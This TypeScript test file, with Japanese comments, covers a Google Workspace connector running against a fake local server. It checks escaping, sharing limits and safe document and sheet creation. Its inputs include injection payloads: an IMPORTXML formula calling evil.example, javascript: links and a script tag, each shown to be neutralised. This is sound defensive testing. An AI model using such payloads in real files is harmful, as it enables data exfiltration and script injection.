/**
 * @file Google ドライブ・ドキュメント・スプレッドシート・スライドの接続口の単体テスト。手元の偽の Google に向けて呼ぶ。
 *
 * `drive.file` の範囲で探す・読む・フォルダ・共有、文書の作成（Markdown を書式にして取り込む）と追記、
 * 表の作成・読み取り・行の追加（値を式として読ませない）を確かめる。
 * スライドは標準の見た目で組み立てる（テンプレートのファイルを使わない）。
 * リンクによる公開を作らないこと、見えないファイルに触れないことも確かめる。
 *
 * @see 仕様書 第14.3.4節「ドライブ」「ドキュメント」「スプレッドシート」、第9.4.2節「標準の見た目」
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import type { AddressInfo } from 'node:net';
import {
  GoogleWorkspaceConnector, SecretBox, renderPdf, type GoogleApiEndpoints, type Repository,
} from '../src/index.js';
import { markdownToDocHtml } from '../src/connectors/google/doc-html.js';
import { DRIVE_READ_MAX_BYTES, kindOf, quoteDriveQuery } from '../src/connectors/google/drive.js';
import { sheetRange, toCell } from '../src/connectors/google/sheets.js';
import { SOURCES_MAX, TABLE_ROWS_MAX, slideRequests } from '../src/connectors/google/slides.js';

const P = { tenantId: 't1', userId: 'u1' };
const G = 'application/vnd.google-apps.';

interface Seen { method: string; path: string; query: URLSearchParams; contentType: string; body: string }

const FILES: Record<string, { name: string; mimeType: string; trashed?: boolean }> = {
  DOC1: { name: '営業定例の議事録', mimeType: `${G}document` },
  SHEET1: { name: '顧客一覧', mimeType: `${G}spreadsheet` },
  SLIDE1: { name: '提案', mimeType: `${G}presentation` },
  PDF1: { name: '請求書.pdf', mimeType: 'application/pdf' },
  TXT1: { name: 'メモ.txt', mimeType: 'text/plain' },
  FORM1: { name: 'アンケート', mimeType: `${G}form` },
  FOLDER1: { name: '議事録', mimeType: `${G}folder` },
  ZIP1: { name: '資料.zip', mimeType: 'application/zip' },
  BIG1: { name: '大きい.pdf', mimeType: 'application/pdf' },
  OLD1: { name: '消した文書', mimeType: `${G}document`, trashed: true },
};

async function fakeDrive(pdf: Uint8Array) {
  const seen: Seen[] = [];
  const server = createServer(async (req, res) => {
    let raw = '';
    for await (const ch of req) raw += ch;
    const url = new URL(req.url!, 'http://x');
    const s: Seen = { method: req.method!, path: url.pathname, query: url.searchParams, contentType: req.headers['content-type'] ?? '', body: raw };
    seen.push(s);
    const json = (status: number, v: unknown) => { res.writeHead(status, { 'content-type': 'application/json' }); res.end(JSON.stringify(v)); };
    const bytes = (b: Uint8Array | string, type: string, length?: number) => {
      res.writeHead(200, { 'content-type': type, 'content-length': String(length ?? Buffer.byteLength(b as string)) });
      res.end(b);
    };
    const meta = (id: string) => ({ id, ...FILES[id], modifiedTime: '2026-09-25T01:00:00.000Z', webViewLink: `https://docs.example/${id}` });

    if (s.path === '/oauth/token') return json(200, { access_token: 'at', expires_in: 3599 });
    if (s.path === '/drive/files' && s.method === 'GET') return json(200, { files: [meta('DOC1'), meta('SHEET1')] });
    // スプレッドシート
    if (s.path === '/sheets/spreadsheets' && s.method === 'POST') {
      return json(200, { spreadsheetId: 'NEWSHEET', spreadsheetUrl: 'https://docs.example/NEWSHEET', sheets: [{ properties: { title: 'シート1' } }] });
    }
    if (s.path.startsWith('/sheets/spreadsheets/NEWSHEET/values/') && s.method === 'PUT') return json(200, { updatedRows: 3 });
    if (s.path === '/drive/files/NEWSHEET' && s.query.get('fields') === 'parents') return json(200, { parents: ['ROOT'] });
    if (s.path === '/drive/files/NEWSHEET' && s.method === 'PATCH') return json(200, { id: 'NEWSHEET' });
    if (s.path === '/sheets/spreadsheets/SHEET1' && s.method === 'GET') return json(200, { sheets: [{ properties: { title: "顧客'一覧" } }] });
    if (s.path.startsWith('/sheets/spreadsheets/SHEET1/values/') && s.path.endsWith(':append') && s.method === 'POST') return json(200, { updates: { updatedRows: 2 } });
    if (s.path.startsWith('/sheets/spreadsheets/SHEET1/values/') && s.method === 'GET') {
      return json(200, { values: [['会社', '担当', '金額'], ['見本商事', '佐藤', 3000], ['見本工業']] });
    }
    if (s.path === '/drive/files' && s.method === 'POST') {
      const b = JSON.parse(s.body) as { name: string; parents?: string[] };
      if (b.parents?.[0] === 'NOPE') return json(404, { error: { code: 404 } });
      return json(200, { id: 'NEWFOLDER', name: b.name, mimeType: `${G}folder`, modifiedTime: '2026-09-25T02:00:00.000Z' });
    }
    const exp = /^\/drive\/files\/([^/]+)\/export$/.exec(s.path);
    if (exp) {
      const id = exp[1]!;
      if (id === 'DOC1') return bytes('﻿営業定例の議事録\n決定: A 案で進める', 'text/plain; charset=utf-8');
      if (id === 'SHEET1') return bytes('会社\t担当\n見本商事\t佐藤', 'text/tab-separated-values');
      if (id === 'SLIDE1') return bytes('提案\n価格は据え置き', 'text/plain');
    }
    const perm = /^\/drive\/files\/([^/]+)\/permissions$/.exec(s.path);
    if (perm && s.method === 'POST') {
      const b = JSON.parse(s.body) as { emailAddress?: string };
      if (b.emailAddress?.endsWith('@outside.example')) {
        return json(403, { error: { code: 403, errors: [{ reason: 'publishOutNotPermitted' }], message: 'Sharing outside not permitted' } });
      }
      return json(200, { id: 'perm1' });
    }
    const file = /^\/drive\/files\/([^/]+)$/.exec(s.path);
    if (file && s.method === 'GET') {
      const id = file[1]!;
      if (!FILES[id]) return json(404, { error: { code: 404 } });
      if (s.query.get('alt') === 'media') {
        if (id === 'PDF1') return bytes(pdf, 'application/pdf', pdf.byteLength);
        if (id === 'TXT1') return bytes('手書きのメモ①', 'text/plain');
        if (id === 'BIG1') { res.writeHead(200, { 'content-type': 'application/pdf', 'content-length': String(DRIVE_READ_MAX_BYTES + 1) }); return res.end(); }
      }
      return json(200, meta(id));
    }
    if (s.path === '/upload/files' && s.method === 'POST') {
      return json(200, { id: 'NEWDOC', name: '作った文書', mimeType: `${G}document`, modifiedTime: '2026-09-25T03:00:00.000Z', webViewLink: 'https://docs.example/NEWDOC' });
    }
    if (s.path === '/docs/documents/DOC1:batchUpdate' && s.method === 'POST') return json(200, { documentId: 'DOC1' });
    // スライド。題名が「失敗」なら組み立てで断る
    if (s.path === '/slides/presentations' && s.method === 'POST') {
      const bad = JSON.parse(raw).title === '失敗';
      return json(200, { presentationId: bad ? 'BADDECK' : 'NEWDECK', pageSize: { width: { magnitude: 9144000 }, height: { magnitude: 5143500 } }, slides: [{ objectId: 'p' }] });
    }
    if (s.path === '/slides/presentations/NEWDECK:batchUpdate' && s.method === 'POST') return json(200, { replies: [] });
    if (s.path === '/slides/presentations/BADDECK:batchUpdate' && s.method === 'POST') return json(400, { error: { code: 400, message: 'Invalid requests[3]' } });
    json(404, { error: { code: 404 } });
  });
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  const endpoints: GoogleApiEndpoints = {
    gmail: `${base}/gmail`, calendar: `${base}/cal`, tasks: `${base}/tasks`, chat: `${base}/chat`,
    drive: `${base}/drive`, driveUpload: `${base}/upload`, docs: `${base}/docs`, sheets: `${base}/sheets`, slides: `${base}/slides`,
    oauth: { auth: `${base}/oauth/auth`, token: `${base}/oauth/token`, tokeninfo: `${base}/oauth/tokeninfo`, userinfo: `${base}/oauth/userinfo`, revoke: `${base}/oauth/revoke` },
  };
  return { endpoints, seen, close: () => new Promise<void>((r) => server.close(() => r())) };
}

async function withDrive(fn: (c: GoogleWorkspaceConnector, seen: Seen[]) => Promise<void>) {
  const pdf = await renderPdf({ title: '請求書', to: '株式会社アルファ 御中', from: ['見本'], fields: [], rows: [{ name: '利用料', quantity: 1, unitPrice: 3000 }], notes: [] });
  const g = await fakeDrive(pdf);
  const box = new SecretBox('テストの鍵');
  const repo = {
    getGoogleConnection: async () => ({ tenantId: P.tenantId, userId: P.userId, refreshTokenEnc: box.encrypt('rt'), googleEmail: 'u1@x.jp', scopes: [], connectedAt: '', checkedAt: '' }),
    getTenantCredential: async () => ({ tenantId: P.tenantId, kind: 'google_oauth', secretEnc: box.encrypt('s'), meta: { clientId: 'cid' }, updatedBy: 'x', updatedAt: '' }),
  } as unknown as Repository;
  try { await fn(new GoogleWorkspaceConnector(repo, box, g.endpoints), g.seen); } finally { await g.close(); }
}

test('ドライブ: 名前で探す。ごみ箱を除き、新しい順。検索の文字は逃がす', async () => {
  await withDrive(async (c, seen) => {
    const items = await c.drive.search(P, { query: "山田's 議事録", limit: 500 });
    assert.deepEqual(items.map((f) => [f.id, f.kind, f.url]), [['DOC1', 'document', 'https://docs.example/DOC1'], ['SHEET1', 'spreadsheet', 'https://docs.example/SHEET1']]);
    const q = seen.find((s) => s.path === '/drive/files')!.query;
    assert.equal(q.get('q'), "trashed = false and name contains '山田\\'s 議事録'");
    assert.equal(q.get('orderBy'), 'modifiedTime desc');
    assert.equal(q.get('pageSize'), '50', '50 件まで');
    await c.drive.search(P, { query: '  ' });
    assert.equal(seen.filter((s) => s.path === '/drive/files').at(-1)!.query.get('q'), 'trashed = false', '空なら見えるものすべて');
  });
  assert.equal(quoteDriveQuery('a\\b'), "'a\\\\b'");
  assert.equal(kindOf(`${G}presentation`), 'presentation');
  assert.equal(kindOf('image/png'), 'other');
});

test('ドライブ: 種類ごとに文字で読む。読めないものは推測で埋めず、そう返す', async () => {
  await withDrive(async (c, seen) => {
    assert.equal((await c.drive.read(P, 'DOC1'))!.text, '営業定例の議事録\n決定: A 案で進める', 'ドキュメントは書き出して読む（BOM は除く）');
    assert.equal(seen.find((s) => s.path === '/drive/files/DOC1/export')!.query.get('mimeType'), 'text/plain');
    assert.equal((await c.drive.read(P, 'SHEET1'))!.text, '会社\t担当\n見本商事\t佐藤', 'スプレッドシートはタブ区切り');
    assert.match((await c.drive.read(P, 'SLIDE1'))!.text, /価格は据え置き/);
    assert.match((await c.drive.read(P, 'PDF1'))!.text, /請求書/, 'PDF は取り出して文字を抜く');
    assert.equal((await c.drive.read(P, 'TXT1'))!.text, '手書きのメモ①');
    assert.match((await c.drive.read(P, 'FORM1'))!.text, /フォームは文字で読めません/);
    assert.match((await c.drive.read(P, 'ZIP1'))!.text, /この種類のファイル（application\/zip）は文字で読めません/);
    assert.match((await c.drive.read(P, 'BIG1'))!.text, /大きすぎるため読みませんでした。5 MB まで/);
    assert.equal(await c.drive.read(P, 'FOLDER1'), null, 'フォルダは読まない');
    assert.equal(await c.drive.read(P, 'OLD1'), null, 'ごみ箱のものは見つからない扱い');
    assert.equal(await c.drive.read(P, 'NOPE'), null, '見えないファイル（404）');
    assert.equal(await c.drive.read(P, ' '), null);
  });
});

test('ドライブ: フォルダを作る。共有は指定した人にだけで、リンクによる公開はしない', async () => {
  await withDrive(async (c, seen) => {
    const folder = await c.drive.createFolder(P, { name: '2026 年の議事録', parentId: null });
    assert.equal(folder.kind, 'folder');
    assert.deepEqual(JSON.parse(seen.find((s) => s.path === '/drive/files' && s.method === 'POST')!.body), { name: '2026 年の議事録', mimeType: `${G}folder` });
    await assert.rejects(c.drive.createFolder(P, { name: 'x', parentId: 'NOPE' }), /親のフォルダが見つかりません/);

    assert.deepEqual(await c.drive.share(P, { fileId: 'DOC1', emails: ['a@x.jp', ' ', 'b@x.jp'], role: 'commenter' }), { fileId: 'DOC1', sharedWith: ['a@x.jp', 'b@x.jp'] });
    const perms = seen.filter((s) => s.path === '/drive/files/DOC1/permissions');
    assert.deepEqual(perms.map((s) => JSON.parse(s.body)), [
      { type: 'user', role: 'commenter', emailAddress: 'a@x.jp' }, { type: 'user', role: 'commenter', emailAddress: 'b@x.jp' },
    ]);
    assert.ok(perms.every((s) => !s.body.includes('anyone')), 'リンクを知っている全員への公開は作らない');
    assert.equal(await c.drive.share(P, { fileId: 'NOPE', emails: ['a@x.jp'], role: 'reader' }), null, '見えないファイルは共有しない');
    await assert.rejects(c.drive.share(P, { fileId: 'DOC1', emails: ['z@outside.example'], role: 'reader' }), /要求を受け付けませんでした（HTTP 403・publishOutNotPermitted）/, '社外への共有を会社が禁じていれば、Google が断る');
  });
});

test('ドライブ: 会社の全員に閲覧だけで共有する。検索には出さず、知らせのメールは送らない（ADR-0025）', async () => {
  await withDrive(async (c, seen) => {
    assert.deepEqual(await c.drive.shareWithDomain(P, { fileId: 'DOC1', domain: 'oesf.jp' }), { fileId: 'DOC1', domain: 'oesf.jp' });
    const perm = seen.find((s) => s.path === '/drive/files/DOC1/permissions')!;
    assert.deepEqual(JSON.parse(perm.body), { type: 'domain', role: 'reader', domain: 'oesf.jp', allowFileDiscovery: false });
    assert.equal(perm.query.get('sendNotificationEmail'), 'false');
    assert.equal(await c.drive.shareWithDomain(P, { fileId: 'NOPE', domain: 'oesf.jp' }), null, '見えないファイルは共有しない');
    assert.equal(await c.drive.shareWithDomain(P, { fileId: 'OLD1', domain: 'oesf.jp' }), null, 'ごみ箱のものは共有しない');
    assert.deepEqual(await c.drive.get(P, 'SHEET1'), { id: 'SHEET1', name: '顧客一覧', kind: 'spreadsheet', modifiedAt: '2026-09-25T01:00:00.000Z', url: 'https://docs.example/SHEET1' });
    assert.equal(await c.drive.get(P, 'NOPE'), null);
  });
});

test('ドキュメント: 本文の Markdown を書式にして取り込ませる。追記は文書にだけ', async () => {
  await withDrive(async (c, seen) => {
    const file = await c.docs.create(P, { title: '議事録', body: '## 決定事項\n- **A 案**で進める', folderId: 'FOLDER1' });
    assert.deepEqual([file.id, file.kind, file.url], ['NEWDOC', 'document', 'https://docs.example/NEWDOC']);
    const up = seen.find((s) => s.path === '/upload/files')!;
    assert.equal(up.query.get('uploadType'), 'multipart');
    assert.match(up.contentType, /^multipart\/related; boundary=/);
    assert.match(up.body, /"name":"議事録","mimeType":"application\/vnd\.google-apps\.document","parents":\["FOLDER1"\]/);
    assert.match(up.body, /Content-Type: text\/html; charset=UTF-8\r\n\r\n<html><body><h2>決定事項<\/h2>\n<ul><li><b>A 案<\/b>で進める<\/li><\/ul><\/body><\/html>/);

    assert.deepEqual(await c.docs.append(P, { documentId: 'DOC1', text: '追記です' }), { documentId: 'DOC1' });
    const upd = seen.find((s) => s.path === '/docs/documents/DOC1:batchUpdate')!;
    assert.deepEqual(JSON.parse(upd.body), { requests: [{ insertText: { endOfSegmentLocation: {}, text: '\n追記です' } }] });
    assert.equal(await c.docs.append(P, { documentId: 'SHEET1', text: 'x' }), null, '文書でないものには追記しない');
    assert.equal(await c.docs.append(P, { documentId: 'OLD1', text: 'x' }), null, 'ごみ箱のものには追記しない');
    assert.equal(await c.docs.append(P, { documentId: 'NOPE', text: 'x' }), null);
    assert.equal(seen.filter((s) => s.path.includes(':batchUpdate')).length, 1);
  });
});

test('文書の HTML: 見出し・太字・入れ子の箇条書き・番号・引用・表・コードを書式にし、中身はエスケープする', () => {
  const html = markdownToDocHtml([
    '# 題 <script>', '', '段落の 1 行目', '2 行目 `a<b` と [リンク](https://example.jp) と [悪い](javascript:x)', '',
    '1. 最初', '   - 下の項目', '2. 次', '', '> 引用の **太字**', '', '| 項目 | 金額 |', '|---|---|', '| 利用料 | 3,000 |', '', '```', '<code> のまま', '```', '---',
  ].join('\n'));
  assert.match(html, /<h1>題 &lt;script&gt;<\/h1>/);
  assert.match(html, /<p>段落の 1 行目<br>2 行目 <code>a&lt;b<\/code> と <a href="https:\/\/example.jp">リンク<\/a> と \[悪い\]\(javascript:x\)<\/p>/, 'http(s) 以外のリンクは押せるようにしない');
  assert.match(html, /<ol><li>最初<ul><li>下の項目<\/li><\/ul><\/li><li>次<\/li><\/ol>/);
  assert.match(html, /<blockquote><p>引用の <b>太字<\/b><\/p><\/blockquote>/);
  assert.match(html, /<table[^>]*>\n<tr><th>項目<\/th><th>金額<\/th><\/tr>\n<tr><td>利用料<\/td><td>3,000<\/td><\/tr>\n<\/table>/);
  assert.match(html, /<pre>&lt;code&gt; のまま<\/pre>/);
  assert.match(html, /<hr>/);
});

test('スプレッドシート: 表を作る。値は式として読ませず、数字だけの値は数にする（第14.3.4節）', async () => {
  await withDrive(async (c, seen) => {
    const file = await c.sheets.create(P, {
      title: '見積の一覧', columns: ['会社', '金額', '番号', 'メモ'],
      rows: [['見本商事', '3000', '0012', '=IMPORTXML("https://evil.example","//a")'], ['見本工業', '-12.5', '3,000', '12345678901234567890']],
      folderId: 'FOLDER1',
    });
    assert.deepEqual([file.id, file.kind, file.name, file.url], ['NEWSHEET', 'spreadsheet', '見積の一覧', 'https://docs.example/NEWSHEET']);
    assert.deepEqual(JSON.parse(seen.find((s) => s.path === '/sheets/spreadsheets')!.body), { properties: { title: '見積の一覧' } });
    const put = seen.find((s) => s.method === 'PUT')!;
    assert.equal(put.query.get('valueInputOption'), 'RAW', '式として読ませない');
    assert.equal(decodeURIComponent(put.path.split('/values/')[1]!), "'シート1'!A1");
    assert.deepEqual(JSON.parse(put.body).values, [
      ['会社', '金額', '番号', 'メモ'],
      ['見本商事', 3000, '0012', '=IMPORTXML("https://evil.example","//a")'],
      ['見本工業', -12.5, '3,000', '12345678901234567890'],
    ], '数字だけの値は数、先頭が 0・記号入り・桁の多いものは文字');
    const move = seen.find((s) => s.method === 'PATCH' && s.path === '/drive/files/NEWSHEET')!;
    assert.equal(move.query.get('addParents'), 'FOLDER1');
    assert.equal(move.query.get('removeParents'), 'ROOT');
    await assert.rejects(c.sheets.create(P, { title: 'x', columns: ['a'], rows: [], folderId: 'DOC1' }), /入れるフォルダが見つかりません/);
    assert.equal(seen.filter((s) => s.path === '/sheets/spreadsheets').length, 1, 'フォルダが無ければ、表を作る前に止める');
  });
  assert.equal(toCell('0'), 0);
  assert.equal(toCell('1e5'), '1e5', '指数の書き方は文字のまま');
  assert.equal(sheetRange("A'B", '1:3'), "'A''B'!1:3");
});

test('スプレッドシート: 最初のシートを、見出しと上限の行数まで読む。表でないものは読まない', async () => {
  await withDrive(async (c, seen) => {
    const res = await c.sheets.read(P, { spreadsheetId: 'SHEET1', maxRows: 50 });
    assert.deepEqual(res!.values, [['会社', '担当', '金額'], ['見本商事', '佐藤', '3000'], ['見本工業']]);
    assert.equal(res!.file.kind, 'spreadsheet');
    const get = seen.find((s) => s.path.startsWith('/sheets/spreadsheets/SHEET1/values/'))!;
    assert.equal(decodeURIComponent(get.path.split('/values/')[1]!), "'顧客''一覧'!1:51", '見出しの 1 行と 50 行');
    assert.equal(get.query.get('valueRenderOption'), 'FORMATTED_VALUE');
    assert.equal(await c.sheets.read(P, { spreadsheetId: 'DOC1', maxRows: 10 }), null, '文書は表として読まない');
    assert.equal(await c.sheets.read(P, { spreadsheetId: 'NOPE', maxRows: 10 }), null);
  });
});

test('スプレッドシート: 末尾に行を足す。式として読ませない。表でないもの・見えないものには足さない', async () => {
  await withDrive(async (c, seen) => {
    assert.deepEqual(await c.sheets.append(P, { spreadsheetId: 'SHEET1', rows: [['新商事', '田中', '500'], ['=1+1']] }), { appended: 2 });
    const app = seen.find((s) => s.path.endsWith(':append'))!;
    assert.equal(app.query.get('valueInputOption'), 'RAW');
    assert.equal(app.query.get('insertDataOption'), 'INSERT_ROWS');
    assert.deepEqual(JSON.parse(app.body).values, [['新商事', '田中', 500], ['=1+1']]);
    assert.equal(await c.sheets.append(P, { spreadsheetId: 'DOC1', rows: [['x']] }), null);
    assert.equal(await c.sheets.append(P, { spreadsheetId: 'NOPE', rows: [['x']] }), null);
    assert.equal(seen.filter((s) => s.path.endsWith(':append')).length, 1);
  });
});


const DECK = {
  title: 'ローカル LLM の動向', subtitle: '2026 年 9 月',
  slides: [
    { layout: 'BULLET' as const, title: '要点', body: '製品が増えた\n価格が下がった', takeaway: '手元で動かせる時代になった' },
    { layout: 'COMPARISON' as const, title: '比べる', compareLeftTitle: '手元', compareLeftBody: '社外に出さない', compareRightTitle: 'クラウド', compareRightBody: '手軽' },
    { layout: 'KPI' as const, title: '数値', stats: [{ value: '12', label: '製品の数' }, { value: '8GB', label: 'メモリ' }] },
    { layout: 'CHART' as const, title: '推移', chartType: 'COLUMN' as const, chartCategories: ['2024', '2025'], chartSeries: [{ name: '製品の数', values: [3, 12000] }] },
    { layout: 'IMAGE' as const, title: '画像', caption: '手元で動く様子' },
  ],
  sources: [{ title: '見本の記事', url: 'https://example.com/a' }, { title: '怪しいリンク', url: 'javascript:alert(1)' }],
};

test('スライド: 標準の見た目で組み立てる。表紙・各レイアウト・出典のページ。共有はしない（第9.4.2節）', async () => {
  await withDrive(async (c, seen) => {
    const made = await c.slides.createPresentation(P, { title: DECK.title, plan: DECK, template: { presentationId: 'TPL', name: '社外提案用' } });
    assert.equal(made.presentationId, 'NEWDECK');
    assert.equal(made.url, 'https://docs.google.com/presentation/d/NEWDECK/edit');
    assert.equal(made.pptxUrl, 'https://docs.google.com/presentation/d/NEWDECK/export/pptx');
    assert.equal(made.pages, 7, '表紙 + 5 枚 + 出典');
    assert.equal(made.templateApplied, false);
    assert.match(made.warnings![0]!, /社外提案用.*標準の見た目/);
    assert.deepEqual(JSON.parse(seen.find((s) => s.path === '/slides/presentations')!.body), { title: DECK.title });
    const reqs = JSON.parse(seen.find((s) => s.path === '/slides/presentations/NEWDECK:batchUpdate')!.body).requests as Record<string, any>[];
    const slides = reqs.filter((r) => r['createSlide']).map((r) => r['createSlide'].objectId);
    assert.deepEqual(slides, ['m2cover', 'm2slide1', 'm2slide2', 'm2slide3', 'm2slide4', 'm2slide5', 'm2src']);
    assert.deepEqual(reqs.at(-1), { deleteObject: { objectId: 'p' } }, '最初から入っていた 1 枚は最後に消す');
    const texts = reqs.filter((r) => r['insertText']).map((r) => r['insertText'].text);
    for (const t of ['ローカル LLM の動向', '2026 年 9 月', '製品が増えた\n価格が下がった', '手元で動かせる時代になった', '手元\n社外に出さない', '12\n製品の数', '12,000', '手元で動く様子', '出典']) {
      assert.ok(texts.includes(t), `「${t}」を置く`);
    }
    assert.equal(reqs.filter((r) => r['createTable']).length, 1, 'グラフは表で示す');
    assert.equal(reqs.filter((r) => r['createParagraphBullets']).length, 1);
    const links = reqs.filter((r) => r['updateTextStyle']?.style?.link).map((r) => r['updateTextStyle'].style.link.url);
    assert.deepEqual(links, ['https://example.com/a'], 'http・https だけをリンクにする');
    assert.ok(!seen.some((s) => s.path.includes('/permissions')), '共有しない');
    const ids = [...JSON.stringify(reqs).matchAll(/"(?:objectId|pageObjectId)":"([^"]+)"/g)].map((m) => m[1]!).filter((id) => id !== 'p');
    assert.deepEqual(ids.filter((id) => id.length < 5), [], 'オブジェクトの ID は 5 文字以上（Slides API の決まり）');
  });
});

test('スライド: 組み立てに失敗したら、作りかけをごみ箱に移して理由を返す（空のスライドを残さない）', async () => {
  await withDrive(async (c, seen) => {
    await assert.rejects(
      c.slides.createPresentation(P, { title: '失敗', plan: { title: '失敗', slides: [{ layout: 'BULLET', title: 'x', body: 'y' }] }, template: null }),
      /スライドを組み立てられませんでした/,
    );
    const trash = seen.find((s) => s.method === 'PATCH' && s.path === '/drive/files/BADDECK')!;
    assert.deepEqual(JSON.parse(trash.body), { trashed: true }, '消さずにごみ箱へ');
  });
});

test('スライド: 表と出典は上限で切り、そのことを注意に残す。副題が無ければ枠を消す', () => {
  const r = slideRequests({
    title: 't',
    slides: [{ layout: 'CHART', title: 'g', chartType: 'BAR', chartCategories: Array.from({ length: 11 }, (_, i) => `項目${i}`), chartSeries: [{ name: 's', values: Array.from({ length: 11 }, (_, i) => i) }] }],
    sources: Array.from({ length: 12 }, (_, i) => ({ title: `出典${i}` })),
  }, { width: 9144000, height: 5143500 }, null);
  assert.equal(r.requests.find((x) => x['createTable'])!['createTable'].rows, TABLE_ROWS_MAX + 1);
  assert.ok(r.warnings.some((w) => w.includes(`${TABLE_ROWS_MAX} 行`)) && r.warnings.some((w) => w.includes(`${SOURCES_MAX} 件`)));
  assert.ok(r.requests.some((x) => x['deleteObject']?.objectId === 'm2cover_s'));
  const r2 = slideRequests({ title: 't', slides: [{ layout: 'BULLET', title: 'b', body: 'x' }] }, { width: 9144000, height: 5143500 }, null);
  assert.equal(r2.pages, 2, '出典が無ければ出典のページを足さない');
});
